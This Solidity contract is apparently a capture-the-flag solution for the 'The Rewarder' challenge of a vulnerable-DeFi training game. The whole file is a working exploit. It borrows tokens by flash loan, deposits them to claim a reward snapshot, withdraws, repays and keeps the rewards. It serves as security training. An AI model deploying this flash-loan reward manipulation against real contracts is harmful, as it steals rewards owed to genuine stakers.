// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract TheRewarderAttacker is Ownable, ReentrancyGuard {
    address private flashLoanerPool;
    address private rewarderPool;
    IERC20 private damnValuableToken;
    IERC20 private rewardToken;

    constructor(
        address _flashLoanerPool,
        address _rewarderPool,
        address _damnValuableToken,
        address _rewardToken
    ) {
        flashLoanerPool = _flashLoanerPool;
        rewarderPool = _rewarderPool;
        damnValuableToken = IERC20(_damnValuableToken);
        rewardToken = IERC20(_rewardToken);
    }

    function receiveFlashLoan(uint256 amount) external nonReentrant {
        // check
        require(msg.sender == flashLoanerPool, "oh~oh~");
        require(amount > 0, "are you kidding me?");

        // deposit into reward pool to get reward
        damnValuableToken.approve(rewarderPool, amount);
        (bool isSuccess, ) = rewarderPool.call(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );
        require(isSuccess, "deposit failed");

        // withdraw
        (bool isSuccessWithdraw, ) = rewarderPool.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        require(isSuccessWithdraw, "withdraw failed");

        // transfer back to flashloan pool
        bool isSuccessTransfer = damnValuableToken.transfer(
            flashLoanerPool,
            amount
        );
        require(isSuccessTransfer, "transfer back to flashloan pool failed");

        // transfer reward to owner
        uint256 balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner(), balance);
    }

    // @dev hehe
    function attack(uint256 amount) external onlyOwner {
        (bool isSuccess, ) = flashLoanerPool.call(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
        require(isSuccess, "flashloan failed");
    }
}
